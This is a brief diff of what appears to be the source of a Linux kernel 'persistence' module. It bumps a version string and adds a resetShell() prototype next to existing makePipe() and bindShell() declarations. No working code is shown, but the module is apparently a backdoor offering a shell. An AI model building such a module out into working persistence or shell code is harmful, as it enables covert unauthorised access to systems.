@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("Claw Persistence Module");
-MODULE_VERSION("cleanup-rev7");
+MODULE_VERSION("cleanup-rev8");
 
 int initModule(void);
 void exitModule(void);
@@ -18,6 +18,7 @@ static ssize_t deviceRead(struct file*, char*, size_t, loff_t*);
 static ssize_t deviceWrite(struct file*, const char*, size_t, loff_t*);
 static int makePipe(void);
 static int bindShell(void);
+static int resetShell(void);
 
 // for character device
 #define SUCCESS 0
